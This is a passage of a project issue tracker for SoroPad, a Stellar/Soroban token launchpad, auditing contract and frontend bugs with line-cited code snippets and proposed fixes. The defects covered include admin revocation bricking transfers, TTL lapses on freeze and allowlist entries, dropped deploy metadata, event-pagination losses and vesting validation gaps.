# 📋 SoroPad Issue Tracker — Wave 10

_Verified against `overhaul/testnet-live` at `13ae7803` (branch tip; `ORIG_HEAD` `9acdcbdb` is the `master` tip). Every issue below was confirmed by reading the current source at the cited line, not by trusting a previous wave's PR title._

**Context:** Wave 9 raised 20 issues (#136–#155 → GitHub #395–414). The fixes genuinely landed: `toBaseUnits` is now exact string arithmetic, the `Frozen` receive-side check exists in `_transfer` and `_mint`, `set_authorization_required` and `renounce_authorization_revocable` were added, the `MAX_ENTRY_TTL_LEDGERS = 6_312_000` test-harness constant was deleted from the token and vesting contracts, `NotificationProvider` is gone, the five `react-hooks` lint rules are back on, and the activity feed now decodes vesting events. This wave does not re-litigate any of that.

It starts from four things the overhaul left behind:

1. **The deploy wizard collects five metadata fields and stores none of them.** `StepMetadata.tsx` asks for `description`, `logoUrl`, `website`, `twitter` and `discord`. `deploy/utils/metadata.ts` defines two localStorage writers for exactly those fields. `grep -rn "savePendingMetadata\|saveMetadataForContract" frontend/` returns the two definitions and **zero call sites**. The fields are also absent from `buildTokenConfigScVals`, so the on-chain `contract_uri` the token contract has accepted since `initialize` is never set either. The result is that no SoroPad token has ever had a description, a logo, or a link, on-chain or off. See #160.
2. **A compliance node plus `revoke_admin` is a permanent, one-way brick.** `_check_compliance` is fail-closed and reads `DataKey::ComplianceNode` from instance storage. `revoke_admin` removes `Admin`, `PendingAdmin` and `PendingAdminExpiry` — and leaves `ComplianceNode` in place. Once the node is archived, panics, or starts rejecting, `set_compliance_node` is the only recovery and it requires an admin that no longer exists. Every `transfer`, `transfer_from` and `clawback` reverts with `ComplianceNodeUnavailable`, forever. The `revoke_admin` doc comment at line 495 states the opposite. See #156.
3. **The `extend_ttl` sweep reached the balance keys and missed the two policy keys.** Every `Balance` write goes through `Self::_ttl_ledgers(&env)`. `freeze_account` (line 521) and `authorize_holder` (line 554) write `Frozen(addr)` and `AuthorizedHolder(addr)` to `persistent()` with **no `extend_ttl` at all**, and neither `_is_frozen` nor `_check_authorized` refreshes on read. A newly written persistent entry gets `min_persistent_entry_ttl` — about 20,736 ledgers, roughly one day on mainnet. A blacklist entry and an allowlist entry both silently expire about a day after they are set. See #157 and #158.
4. **The event pipeline has never been tested against a burst.** `useContractEvents` asks for `limit: 100` with a start ledger that advances past whatever it saw, and `mint_batch` accepts up to 100 recipients, each of which emits its own `mint` event, in a single transaction and therefore a single ledger. A 100-recipient batch emits 101 events in one ledger; the 101st is dropped and the cursor has already moved past it. See #162.

On top of those, the feature comparison against [pons](https://www.ponsfamily.com/launchpad) — a Robinhood Chain launchpad — turned up a structural gap. SoroPad is a **token deployer with an admin control surface**. It is not a marketplace: there is no pool, no price, no swap, no slippage, no fee, no discovery page, and no market analytics anywhere in the repo. `PRD.md` §4 explicitly puts "DEX / swap integration" out of scope for v1.0, so this is a deliberate boundary rather than an oversight — but the boundary is undocumented on the product surface, the README advertises a "treasury", and a launchpad whose launches are unbuyable is a wallet, not a venue. Part 6 is that gap, and Part 7 is what to build about it.

Complexity levels:

- 🟢 **Trivial** (100 pts) — Small, well-defined
- 🟡 **Medium** (150 pts) — Standard features or involved bug fixes
- 🔴 **High** (200 pts) — Complex features, integrations, or architectural changes

> Issues re-opened because a closed issue's fix did not land, or landed in only one of several code paths, are flagged **(regression of #N)**.

**Not in this wave, deliberately.** Six open Wave 8 issues have partly-stale descriptions and should be updated in place rather than re-filed: **#107** (`burn`/`burn_self` duplication is re-raised as #177 with the current line numbers), **#109** (`Recipients` is now an indexed `RecipientAt(u32)` list with `prune_recipient`; the O(n) rewrite problem moved to #175 and #178), **#123** (bindings exist for `token` and `vesting`; the gap is now `factory` and `airdrop`, folded into #205), **#127** (the committed build artifacts are now `frontend/tsconfig.audit.tsbuildinfo` plus the four `test_snapshots/` trees; folded into #198), **#134** (the airdrop shipped; what it lacks is the off-chain list, folded into #207), and **#135** (the badge shipped; what is missing is that the deploy path never consults it, re-raised as #195).

---

## Part 1: Live failures

### 156. Token: a compliance node plus `revoke_admin` permanently bricks every transfer, and the doc says the opposite

🔴 **High** · `contracts` `token` `security` `correctness`

**Files:** `contracts/token/src/lib.rs` lines 338–365 (`clawback`), 486–512 (`revoke_admin`), 1039–1074 (`set_compliance_node`), 1203–1242 (`_check_compliance`)

**Issue:** The token has a compliance node that is **fail closed**, and that is the right default:

```rust
// line 1240
Ok(Err(_)) | Err(_) => panic_with_error!(env, TokenError::ComplianceNodeUnavailable),
```

The doc at line 1211 says recovery is always available because `set_compliance_node` can clear the node. That stops being true the moment `revoke_admin` runs. `revoke_admin` is:

```rust
// lines 505–510
env.storage().instance().set(&DataKey::Locked, &true);
env.storage().instance().remove(&DataKey::Admin);
env.storage().instance().remove(&DataKey::PendingAdmin);
env.storage().instance().remove(&DataKey::PendingAdminExpiry);
```

`DataKey::ComplianceNode` is not in that list, and it is not in the `Locked` masking that `max_balance_per_account` does at lines 998–1008. So after `revoke_admin`:

- `_require_admin` fails on `_require_not_locked`, so `set_compliance_node` can never be called again.
- The instance still holds `ComplianceNode`, so `_check_compliance` still fires on every `transfer` (line 686), every `transfer_from` (line 774) and every `clawback` (line 350).
- If the node is archived, panics, or answers `false`, all three revert with `ComplianceNodeUnavailable`. There is no other writer of that key.

The token is then permanently non-transferable, with no admin, no upgrade path, and no recovery. The `revoke_admin` doc comment states the opposite:

```rust
/// Holders can still `transfer`, `approve`, `transfer_from`, `burn`,
/// and `burn_self`. The token becomes trustless / immutable.
```

That is false for any token that ever set a compliance node. `approve` and the burns do survive; the two `transfer` paths do not.

**Fix:** Make `revoke_admin` refuse to proceed while a compliance node is configured, returning a typed error the UI can explain ("clear the compliance node before revoking admin") — or, better, have `revoke_admin` remove `DataKey::ComplianceNode` and emit that removal in the `revoked` event so the revocation is self-documenting. Whichever you choose, correct the line 495 comment and add a test: configure a mock node, `revoke_admin`, then assert `transfer` succeeds (or fails with the specific documented error) — the absence of that test is why this survived the compliance-node work in #405.

---

### 157. Token: `Frozen` entries are written without `extend_ttl`, so a blacklist silently expires in about a day

🔴 **High** · `contracts` `token` `security` `correctness`

**Files:** `contracts/token/src/lib.rs` lines 519–525 (`freeze_account`), 528–534 (`unfreeze_account`), 1150–1155 (`_is_frozen`)

**Issue:** Every other persistent write in the contract asks for a clamped TTL. This one does not:

```rust
// lines 521–523
env.storage()
    .persistent()
    .set(&DataKey::Frozen(addr.clone()), &true);
env.events().publish((symbol_short!("freeze"), addr), ());
```

There is no `extend_ttl`. A newly written persistent entry receives the host's `min_persistent_entry_ttl`, which on mainnet is about 20,736 ledgers — roughly one day at five-second ledgers. After that the entry is archived and `is_frozen` returns `false` again:

```rust
// lines 1150–1155 — a read, so it cannot extend anything
fn _is_frozen(env: &Env, addr: &Address) -> bool {
    env.storage().persistent().get(&DataKey::Frozen(addr.clone())).unwrap_or(false)
}
```

So the contract's most serious compliance control lapses on a timer nobody chose and nothing surfaces. An account frozen in January is transferable in February. The `unfreeze` button in `SecurityCard` will then report "not frozen" for an account that is, in the issuer's intent, blacklisted.

The contrast with the same file is what makes this a defect rather than a choice: `initialize` extends the `AuthorizedHolder` key it writes (lines 266–270), and every `Balance` write goes through `Self::_ttl_ledgers(&env)`. `freeze_account` is the one persistent write that was missed.

**Fix:** `let ttl = Self::_ttl_ledgers(&env);` then `extend_ttl(&key, ttl, ttl)` after the `set`, and do the same on the `_is_frozen` read path so an actively-used blacklist never lapses. Add a test that freezes, advances the test ledger past `min_persistent_entry_ttl`, and asserts `is_frozen` is still `true` — the test environment reports 6,312,000 for `max_ttl`, so the test must step the ledger explicitly rather than rely on the ceiling.

---

### 158. Token: `AuthorizedHolder` entries are written without `extend_ttl`, so the allowlist silently expires too

🔴 **High** · `contracts` `token` `security` `correctness`

**Files:** `contracts/token/src/lib.rs` lines 552–559 (`authorize_holder`), 1099–1115 (`check_authorized`), 582–595 (`is_authorized`)

**Issue:** The same defect as #157, on the other policy key. `initialize` extends the entry it writes (lines 264–271); `authorize_holder`, which is the function that actually populates the list in normal operation, does not:

```rust
// lines 554–556
env.storage()
    .persistent()
    .set(&DataKey::AuthorizedHolder(holder.clone()), &true);
env.events().publish((symbol_short!("authorize"), holder), ());
```

`_check_authorized` (line 1099) and `is_authorized` (line 582) both read without extending. So with `authorization_required = true`, every `authorize_holder` grant stops being effective about a day later, and every subsequent transfer to a listed holder fails with `NotAuthorizedHolder` — while `authorization_required()` still returns `true` and the UI still shows the policy as on.

This is a live denial of service in the regulated-token configuration the feature exists to serve, and it is worse than #157 because the admin can turn it off (`set_authorization_required(false)`) and thereby un-gate every transfer rather than restore the allowlist.

**Fix:** Identical to #157 — extend on write with `Self::_ttl_ledgers(&env)`, and extend on the `_check_authorized` read so a policy in active use stays warm. Fold both into one helper (`_touch_policy_entry`) so the next policy key inherits the fix rather than repeating the omission.

---

### 159. Token: `mint_batch` hardcodes a TTL of about six days, so batch-minted balances archive 30× sooner than single-minted ones

🔴 **High** · `contracts` `token` `correctness` (regression of #94)

**Files:** `contracts/token/src/lib.rs` line 384

**Issue:** Wave 8's #94 found a "52 weeks" constant that was actually about six days, copy-pasted five times. Four of the five were fixed. One was missed, and it is the only one left:

```rust
// line 384, inside mint_batch
let ttl_ledgers = 52 * 7 * 24 * 60 / 5; // ~52 weeks (assuming 5-second ledgers)
```

`52 * 7 * 24 * 60 / 5` is `104,832` ledgers, which at five seconds is **6.07 days**. Every other TTL site in the contract calls `Self::_ttl_ledgers(&env)`, which requests a year and clamps to `max_ttl()` (about 180 days on today's networks). So a holder who received their tokens from a single `mint` gets a 180-day window and a holder who received theirs from the same admin's `mint_batch` — a batch of up to 100, in one transaction, the documented way to do a distribution — gets six days.

The consequence is a token that works perfectly until a batch airdrop, at which point those balances archive and the recipients' transfers start failing with an archived-entry error. `docs/mint-batch-feature-guide.md` presents batch minting as the recommended path for distributions and never mentions the difference.

The same line is also the one site that does not clamp, so if the network's `max_entry_ttl` is ever lowered below 104,832 the call becomes a hard error for temporary entries and a silent clamp for persistent ones — the asymmetry wave9's #140 documented, reintroduced through a different door.

**Fix:** Delete the local and call `Self::_ttl_ledgers(&env)`, exactly as the other eleven sites do. Then add a CI guard for the class rather than the instance: a test that asserts no `let ttl_ledgers = ` literal exists outside the two module-level `TTL_LEDGERS` constants, or a `grep` step in `ci.yml`. Four of five copies were found and fixed by hand; the fifth survived because nothing prevents a sixth.

---

### 160. Deploy: the wizard collects five metadata fields and stores none of them

🔴 **High** · `frontend` `deploy` `correctness` `product`

**Files:** `frontend/app/deploy/steps/StepMetadata.tsx` lines 43–77; `frontend/app/deploy/utils/metadata.ts` (whole file, 29 lines); `frontend/app/deploy/DeployForm.tsx` line 20; `frontend/app/hooks/useDeployToken.ts` lines 208–253 (`buildTokenConfigScVals`)

**Issue:** The metadata step registers five optional text inputs:

```tsx
// StepMetadata.tsx
<Input label={t("descriptionLabel")} {...register("description")} ... />
<Input label={t("logoUrl")}        {...register("logoUrl")} ... />
<Input label={t("website")}        {...register("website")} ... />
<Input label={t("twitter")}        {...register("twitter")} ... />
<Input label={t("discord")}        {...register("discord")} ... />
```

The schema carries all five (DeployForm.tsx lines 77–81). And `DeployForm.tsx:20` imports the writer:

```ts
import { savePendingMetadata } from "./utils/metadata";
```

`grep -rn "savePendingMetadata\|saveMetadataForContract" frontend/` returns the two function definitions in `metadata.ts` and **no call sites anywhere**. The import is unused. The five values flow into `formData`, through `deploySchema`, into the `useDeployToken` params object, and are then dropped: `DeployTokenParams` does not declare them, and `buildTokenConfigScVals` emits exactly nine keys, none of them metadata.

On the chain, the token contract has accepted `contract_uri: Option<String>` in `initialize` since the parameter existed. The deploy path does not send it, so `contract_uri()` returns `None` forever. `TokenDashboard.tsx` line 211 gates a whole "Metadata" panel on `tokenInfo.contractUri`; that panel has never rendered. `lib/stellar.ts:646–653` simulates a `contract_uri` call whose result is always nothing, inside a `try` whose comment says "may not be implemented or accessible; ignore".

So: a founder fills in a description and a logo URL, sees the review step, signs, and the token launches with no description and no logo — for them, for a visitor on the public page, for the OG card, and for any indexer. Nothing anywhere holds the data. This is the single largest gap between what the UI promises and what the product is.

**Fix:** This is not a wiring fix; it needs a destination, and there are two, so pick deliberately:

1. **On-chain (recommended, and what #204 builds properly):** add the five fields to a metadata registry keyed by contract ID, written in the same factory transaction as `initialize`. Content-address the JSON, store the digest, and the token's `contract_uri` points at a gateway URL. Then the fields are readable by third parties with no SoroPad account and no API key, which is the property pons calls "onchain-native integration".
2. **Off-chain (the minimum that stops the data loss):** call the two functions that already exist. `saveMetadataForContract(contractId, metadata)` after a successful deploy, and have `PublicTokenPage`, `TokenDashboard` and the OG route read it. This fixes the loss and nothing else — it is still per-browser, and the moment the founder clears site data the token is anonymous again.

Do (2) now and file (1) as #204. Add a test that asserts every field the schema accepts is either written or on-chain after deploy; the reason this is invisible is that no test crosses the schema-to-storage boundary.

---

### 161. Indexer: the RPC fallback cursor re-reads its own last ledger, so history duplicates forever and pagination can stall

🔴 **High** · `frontend` `indexer` `correctness`

**Files:** `frontend/lib/indexer.ts` lines 120–125 and 80–95

**Issue:** Without a Mercury token — which is the default, see #180 — every event read in the app goes through `fetchEventsFromRpc`. It paginates by deriving the next start ledger from the last event it saw:

```ts
// lines 121–125
let nextCursor: string | null = null;
if (events.length > 0) {
  const lastEvent = events[events.length - 1];
  nextCursor = `ledger-${lastEvent.ledger}`;
}
```

and parsing it back on the next page:

```ts
// lines 81–88
if (cursor) {
  const cursorParts = cursor.split("-");
  if (cursorParts.length === 2) {
    const parsed = parseInt(cursorParts[1], 10);
    if (!isNaN(parsed)) startLedger = parsed;
  }
}
```

The round trip is `next = last.ledger`, not `last.ledger + 1`. Every page therefore re-fetches the ledger it stopped in. `ActivityFeed` dedupes by event `id` so the duplication is invisible in the UI, which is exactly why nobody has noticed — but two things break underneath:

- **A ledger with more events than the page limit is unreachable.** If the last ledger returned holds more than `limit` events, the next page starts at that same ledger and returns the same first `limit`. `ActivityFeed` filters them all out as already-seen ids and sets `nextCursor` to the same value again. "Load more" is now an infinite loop that never advances, and every event in that ledger past the limit is never shown.
- **The `ActivityFeed` refresh path resets to page one** (line 85, `setOperations(records)`), so a user who paged to page four and then waited ten seconds for a live event is thrown back to page one.

**Fix:** `nextCursor = \`ledger-${lastEvent.ledger + 1}\`` and, on the parse side, keep the value as the exclusive start (which is what `getEvents` already treats it as). Then make the `limit`-saturated case explicit: if `events.length === limit`, do not trust the ledger-derived cursor at all — return a marker that the caller must re-issue the same ledger with a tighter topic filter, or fall back to the ledger-scan path. Add a test with a mocked RPC that returns a saturated page and assert the second call's `startLedger` is strictly greater.

---

### 162. `useContractEvents`: `limit: 100` plus a one-shot cursor silently drops the tail of every large batch

🔴 **High** · `frontend` `hooks` `correctness`

**Files:** `frontend/hooks/useContractEvents.ts` lines 83–95, 107–150

**Issue:** The polling hook requests one page and advances its cursor past whatever it saw:

```ts
// lines 85–89
const response = await getEvents.call(rpc, {
  startLedger,
  filters: [{ type: "contract", contractIds: watchedIds }],
  pagination: { limit: 100 },
});
```

```ts
// lines 148–150
if (maxLedgerSeen >= startLedgerRef.current) {
  startLedgerRef.current = maxLedgerSeen + 1;
}
```

There is no pagination cursor, no `while` loop, and no check that the page was saturated. `mint_batch` accepts up to 100 recipients and calls `_mint` for each, and `_mint` publishes a `mint` event every time (line 1322). A 100-recipient batch therefore emits **100 `mint` events plus the transaction's own diagnostic event in a single ledger**. `limit: 100` is exactly at that boundary, so the last event of every maximum-size batch is discarded — and because `startLedgerRef` has already advanced past that ledger, it is discarded permanently. The activity feed will show 99 of 100 recipients for every full batch, forever.

The same loss applies to any window where the contract emits more than 100 events between two polls: a busy day, a tab left in the background for an hour, or a second `mint_batch` landing in the same poll interval. None of it is retried.

**Fix:** Follow the cursor until the page is short, with a hard iteration cap (say 20 pages) so a hot contract cannot spin:

```ts
let cursor = startLedger;
for (let page = 0; page < 20; page++) {
  const res = await getEvents.call(rpc, { startLedger: cursor, filters, pagination: { limit: 100 } });
  collect(res.events ?? []);
  if ((res.events?.length ?? 0) < 100) break;
  cursor = (res.events[res.events.length - 1].ledger ?? cursor) + 1;
}
```

Add a test with a mocked `getEvents` that returns 100 events in one ledger followed by 1 in the next, and assert all 101 are collected. The mock is the point: a single-page mock cannot fail against the current code.

---

### 163. `useContractEvents` starts at the current latest ledger, so the live feed has no history

🟡 **Medium** · `frontend` `hooks` `dashboard` `ux`

**Files:** `frontend/hooks/useContractEvents.ts` lines 102–105; `frontend/app/dashboard/[contractId]/ActivityFeed.tsx` lines 111–120

**Issue:** On first mount the hook anchors itself to the head of the chain:

```ts
// lines 102–105
if (startLedgerRef.current === null) {
  const { sequence } = await rpc.getLatestLedger();
  startLedgerRef.current = sequence;
}
```

So the hook is a *live tail*, not a history. That is a reasonable design for a poller, and `ActivityFeed` compensates by loading page one from the indexer separately — but the compensation is where the problem shows. `liveEvents` is an accumulator that only ever grows forward from the moment the page loaded, and it is merged in with:

```ts
// lines 111–120
if (liveEvents.length > 0) {
  setOperations((prev) => {
    const existingIds = new Set(prev.map((op) => op.id));
    const newOps = liveEvents.filter((op) => !existingIds.has(op.id));
    return [...newOps, ...prev];
  });
}
```

Three consequences. First, on a token that has been quiet for a week the live feed contributes nothing and the user sees the indexer's page one only. Second, the merge is not ordered: `liveEvents` arrives newest-first, so prepending is correct for a live batch, but if a poll spans several ledgers the ordering within the batch is only as good as the RPC's. Third, and most visibly, the two sources have different filters. `useContractEvents` watches `contractIds` with **no topic filter** — every event the contract emits, including ones `decodeActivityEvent` returns `null` for and the hook silently drops (line 141). The indexer path filters on `TRACKED_EVENT_TOPICS`. Any event that the decoder does not recognise is therefore invisible in the live channel and, because the live channel is the only thing that adds to a paged feed without a refresh, invisible until a manual reload.

**Fix:** Anchor the first poll to the ledger of the newest event already in `operations` rather than to the chain head, so the live channel is a continuation of the paged history instead of a parallel stream. Return the count of dropped (undecodable) events from the hook and surface it in the feed's empty state, so "the contract emitted 4 event types this app does not decode" is a visible state rather than silence.

---

## Part 2: Contract policy and lifecycle

### 164. Token: the `admin()` getter panics after `revoke_admin`, so the dashboard cannot tell "locked" from "not a token"

🟡 **Medium** · `contracts` `token` `frontend` `correctness`

**Files:** `contracts/token/src/lib.rs` lines 892–905; `frontend/lib/stellar.ts` lines 632, 643, 674, 682, 690, 739, 749; `frontend/app/dashboard/[contractId]/TokenDashboard.tsx` line 238

**Issue:** A read-only getter that panics is a design decision with consequences, and here it propagates into a wrong UI state rather than a clear error:

```rust
// lines 892–905
pub fn admin(env: Env) -> Address {
    let locked: bool = env.storage().instance().get(&DataKey::Locked).unwrap_or(false);
    if locked {
        panic_with_error!(&env, TokenError::Locked);
    }
    env.storage().instance().get(&DataKey::Admin)
        .unwrap_or_else(|| panic_with_error!(&env, TokenError::NotInitialized))
}
```

`lib/stellar.ts` reads `admin` inside a `try` whose failure is swallowed — one of seven "the getter may not be implemented" fallbacks in that file. So after `revoke_admin`, `tokenInfo.admin` is `undefined`, and the admin panel's gate is:

```tsx
// TokenDashboard.tsx:238
{publicKey && tokenInfo.admin === publicKey && <AdminPanel ... />}
```

`undefined === publicKey` is false, so the panel correctly disappears. But the dashboard also has nothing left to say: `is_locked()` exists (line 931) and is never called from the frontend, so a holder looking at a revoked token sees a dashboard that is quietly missing its whole administrative half, with no banner explaining that the issuer permanently gave up control. `PendingAdminBanner` and `TokenStatusBanner` exist and neither covers this state.

Compare the vesting contract, which got this right. `get_admin` there distinguishes the two cases explicitly (line 669: "Distinguish 'never initialized' from 'admin deliberately revoked'"). The token contract did not.

**Fix:** Return `Option<Address>` from a new `admin_if_any()` and keep `admin()` as the strict view for compatibility, then have the dashboard call the former and render a permanent "issuer has renounced control — this token is immutable" banner when it is `None` and `is_locked()` is `true`. Delete one of the seven `try`-and-default fallbacks in `lib/stellar.ts` at the same time, which is the mechanism that turns every getter failure into a silent default.

---

### 165. `revoke_admin` leaves `ComplianceNode`, `MaxSupply`, `ContractUri` and `AuthorizationRequired` readable on a locked token

🟡 **Medium** · `contracts` `token` `correctness` `docs`

**Files:** `contracts/token/src/lib.rs` lines 486–512, 599–604, 981–983, 1053–1074, 1085–1087

**Issue:** Wave 9's #143 established the principle that a locked token must not report a policy it is no longer enforcing, and implemented it for exactly one key:

```rust
// lines 998–1008
pub fn max_balance_per_account(env: Env) -> Option<u32> {
    let locked: bool = env.storage().instance().get(&DataKey::Locked).unwrap_or(false);
    if locked { return None; }
    env.storage().instance().get(&DataKey::MaxBalancePerAccount)
}
```

The other four keys that `revoke_admin` deactivates were not given the same treatment:

| Getter | Value after `revoke_admin` | Truth |
| --- | --- | --- |
| `authorization_required()` | the flag as set | the gate is dead — no `authorize_holder` can ever run again, so nobody can join the list |
| `max_supply()` | the cap as set | still true, and worth keeping |
| `contract_uri()` | the URI as set | still true, and worth keeping |
| `compliance_node()` | the node as set | **actively harmful** — see #156 |

Only the second of those four is genuinely misleading. `authorization_required()` returning `true` on a locked token is the same class of lie: a holder reads "this token requires authorization to receive", believes transfers need pre-approval, and has no way to obtain it.

**Fix:** Mask `authorization_required()` and `compliance_node()` under `Locked` the way `max_balance_per_account()` is masked, and add a comment to the two getters that stay unmasked saying why they remain readable (they are historical facts, not live policy). Add `is_locked()` to the frontend's `fetchTokenInfo` and use it to drive the banner from #164.

---

### 166. Vesting: `create_schedules_batch` never rejects a past cliff

🔴 **High** · `contracts` `vesting` `correctness`

**Files:** `contracts/vesting/src/lib.rs` lines 222–279 (`create_schedule`) and 290–380 (`create_schedules_batch`)

**Issue:** The single-schedule path has three validations, one of which the batch path is missing:

```rust
// create_schedule, lines 232–238
Self::_validate_total_amount(&env, total_amount);
if cliff_ledger < env.ledger().sequence() {
    panic_with_error!(&env, VestingError::CliffInPast);
}
if end_ledger <= cliff_ledger {
    panic_with_error!(&env, VestingError::InvalidLedgerRange);
}
```

```rust
// create_schedules_batch, lines 316–319
Self::_validate_total_amount(&env, input.total_amount);
if input.end_ledger <= input.cliff_ledger {
    panic_with_error!(&env, VestingError::InvalidLedgerRange);
}
```

`CliffInPast` is not in the batch loop. A batch of fifty schedules with `cliff_ledger` and `end_ledger` both in the past is accepted, funded, and written. Every one of those schedules is instantly 100% vested, and `release_all` will transfer the whole allocation in a single transaction. There is a test for the single path (`test_create_schedule_past_cliff_panics`, line 1167) and none for the batch path, which is the only reason the omission is invisible.

The same asymmetry applies to the **batch size**: `create_schedule` has no per-recipient cap while `create_schedules_batch` caps the *call* at 50, so a single recipient can accumulate an unbounded number of schedules by calling `create_schedule` repeatedly — which is the direct cause of #175.

**Fix:** Add the `CliffInPast` check to the batch validation loop, reusing the same error. Then state the cap policy explicitly in one place: either `create_schedule` gains a per-recipient schedule cap, or the aggregate getters in #175 gain a page size. Pick the first, because an unbounded loop over storage is a resource-exhaustion vector against the whole network, not just against one recipient.

---

### 167. Vesting: `prune_recipient` can make a live grant unreachable, and never checks that the recipient is settled

🟡 **Medium** · `contracts` `vesting` `correctness`

**Files:** `contracts/vesting/src/lib.rs` lines 729–750 (`prune_recipient`), 1070–1084 (`_add_recipient`), 273–275 and 363–365 (the two `_add_recipient` call sites)

**Issue:** The function's doc claims a constraint it does not enforce:

```rust
/// Admin-only: remove a fully-settled recipient from the enumeration
/// index. Does not touch the recipient's schedules — it only prunes the
/// enumeration slot(s) so `get_recipients_paginated` stops listing them.
```

"fully-settled" appears nowhere in the body. The body removes the slot for any recipient the admin names:

```rust
// lines 735–744
while i < total {
    let key = DataKey::RecipientAt(i);
    if let Some(stored) = env.storage().persistent().get::<DataKey, Address>(&key) {
        if stored == recipient {
            env.storage().persistent().remove(&key);
            pruned = true;
        }
    }
    i += 1;
}
```

So an admin can prune a recipient holding a schedule that is 10% vested and 90% still locked. The schedules are untouched, the tokens are still owed, and `release`/`release_all` still work because they resolve by `(recipient, index)` and never consult the enumeration. What breaks is discovery: `get_recipients_paginated` is the only enumeration, and it is what `VestingDashboard.tsx` (716 lines) pages through. The recipient vanishes from the admin's dashboard while still owing a claim.

There is a second, sharper failure. `_add_recipient` is guarded at both call sites by `if schedule_index == 0`, and `schedule_index` comes from `DataKey::ScheduleCount(recipient)`, which `prune_recipient` does not touch. So the sequence is:

1. Recipient gets schedule 0. `_add_recipient` writes `RecipientAt(0)`.
2. Admin prunes them. `RecipientAt(0)` is removed. `RecipientCount` stays at 1 (correct — the slot is a hole, and the getter at line 700 documents that holes shorten a page).
3. Admin creates a new schedule for the same recipient. `schedule_index` is 1, so `_add_recipient` is not called.
4. The recipient now has a live, releasable grant and is permanently absent from every enumeration, and will be forever — the list is append-only and `RecipientCount` never decreases.

**Fix:** Require settlement before pruning: assert that `total_releasable(recipient) == 0` and `total_vested(recipient) == total_released(recipient)` for every schedule, and return a new typed error otherwise. Separately, make re-enumeration possible — either decrement `RecipientCount` and re-pack, or (simpler and cheaper) make `_add_recipient` idempotent by tracking a `Listed(Address)` marker rather than keying the guard off `schedule_index == 0`. Add the test for both halves: prune-then-regrant, and prune-with-a-live-schedule.

---

### 168. Vesting: a token-level pause, freeze, or allowlist gate makes every release and every revoke revert forever

🔴 **High** · `contracts` `vesting` `security` `correctness`

**Files:** `contracts/vesting/src/lib.rs` lines 384–427 (`release`), 453–499 (`revoke`), 827–886 (`release_all`), 436–449 (`keep_alive`); `contracts/token/src/lib.rs` lines 677–702 (`transfer`), 678 (`_check_paused`), 1367–1372 (`_transfer` receive-side freeze), 1099–1115 (`check_authorized`)

**Issue:** The vesting contract moves value with exactly one primitive:

```rust
// line 422–423
let token_client = soroban_sdk::token::Client::new(&env, &token_addr);
token_client.transfer(&env.current_contract_address(), &recipient, &releasable);
```

That lands in the token's `transfer`, which enforces four separate policies the vesting contract has no visibility into and no way to satisfy:

- `Self::_check_paused(&env)` at token line 678. If the **token** admin pauses the token, every `release`, `release_all` and `revoke` reverts with `Paused`.
- `_transfer`'s receive-side freeze at token line 1368. If the **token** admin freezes the vesting contract's own address, every release reverts with `Frozen`.
- `_check_authorized(&env, to)` at token line 1287, called from `_mint` — and, on the transfer path, from token lines 687 and 775. If `authorization_required` is turned on and the vesting contract's address was never passed to `authorize_holder`, every release reverts with `NotAuthorizedHolder`, and the token admin's only remedy is to authorize a contract address they have no UI for.
- `_check_compliance(&env, from, to)` at token line 686. A compliance node that rejects the vesting contract blocks all releases.

`keep_alive` is the only function that survives, because it touches no tokens. There is no `emergency_sweep`, no `recover_to(recipient)`, and no way for the vesting admin — who is a *different* address from the token admin — to observe that any of this has happened. `solvency()` (line 569) would still report `solvent: true`, because the tokens are sitting in the contract, not missing.

Wave 8's #112 covered the mirror image (vesting `pause` blocking `release` for already-vested tokens) and it is fixed. The token-side equivalents were never examined, and they are the more likely direction: the token admin is the party with the freeze button and the allowlist.

**Fix:** Add an `emergency_withdraw(recipient: Address, to: Address)` admin function on the vesting contract that transfers `total_releasable(recipient)` to a recipient-chosen address, documented explicitly as the path that survives a token-level pause or freeze, plus a `transfer_control_to_vesting_admin()` on the token so the two admins can be unified. Add a test: deploy a token and a vesting contract, freeze the vesting contract's address on the token, assert `release` reverts and `emergency_withdraw` succeeds. Also surface the token's `is_paused()` and `is_frozen(vesting_contract)` in `VestingDashboard`, so the admin can see the cause instead of a bare failure.

---

### 169. Vesting: `extend_cliff` skips the TTL refresh and adds to `u32` unchecked

🟡 **Medium** · `contracts` `vesting` `correctness`

**Files:** `contracts/vesting/src/lib.rs` lines 512–547; compare 265–270 (`create_schedule`'s TTL handling)

**Issue:** Two defects in one function. The write:

```rust
// line 532
let new_end = schedule.end_ledger + delta;
```

is an unchecked `u32` addition. `extend_cliff` has no upper bound on `new_cliff` and no `checked_add`, so a large enough delta overflows. In a debug build that is a panic with an unhelpful message; in the release WASM this project actually ships it wraps, after which the `new_cliff >= new_end` guard at line 534 fires and the caller gets `CliffAfterEnd` — a correct rejection, reached by accident, for the wrong reason. `end_ledger - cliff_ledger` is a `u32`, so `end_ledger + delta` can exceed `u32::MAX` for any schedule near the top of the range.

The more consequential one is the missing TTL. `create_schedule` extends the schedule entry after writing it:

```rust
// lines 265–270
env.storage().persistent().set(&key, &schedule);
let ttl_ledgers = Self::_ttl_ledgers(&env, end_ledger);
Self::_extend_persistent_ttl(&env, &key, ttl_ledgers);
```

`extend_cliff` writes and stops:

```rust
// lines 538–540
schedule.cliff_ledger = new_cliff;
schedule.end_ledger = new_end;
env.storage().persistent().set(&key, &schedule);
```

Extending a cliff *by definition* pushes `end_ledger` further out — that is the whole purpose. So the admin extends a two-year schedule by another year, the entry keeps the TTL it was created with, and it archives while the grant is still live. For any schedule already near the ~180-day network ceiling this is not a hypothetical: the extension silently shortens the grant's guaranteed life by the amount the cliff moved.

**Fix:** `let new_end = schedule.end_ledger.checked_add(delta).unwrap_or_else(|| panic_with_error!(&env, VestingError::InvalidLedgerRange));` and then the same `Self::_ttl_ledgers(&env, new_end)` + `_extend_persistent_ttl` pair `create_schedule` uses. Add a test that creates a schedule at the current TTL ceiling, extends the cliff past it, and asserts the entry's TTL is now the new one.

---

### 170. Vesting: the admin-transfer lifecycle is a weaker copy of the token's

🟢 **Trivial** · `contracts` `vesting` `quality`

**Files:** `contracts/vesting/src/lib.rs` lines 185–212; compare `contracts/token/src/lib.rs` lines 417–450

**Issue:** The two contracts implement the same three functions with three different levels of care. The token's:

| Behaviour | token | vesting |
| --- | --- | --- |
| Proposal expires | `ADMIN_PROPOSAL_EXPIRY_LEDGERS`, checked in `accept_admin` (line 467) | no expiry field, no check |
| `propose_admin(current_admin)` rejected | yes, `AlreadyAdmin` (line 424) | no |
| Re-proposing over an existing proposal | replaces it, event emitted | replaces it, event emitted |
| `accept_admin` while paused | rejected, `_check_paused` (line 455) | accepted |
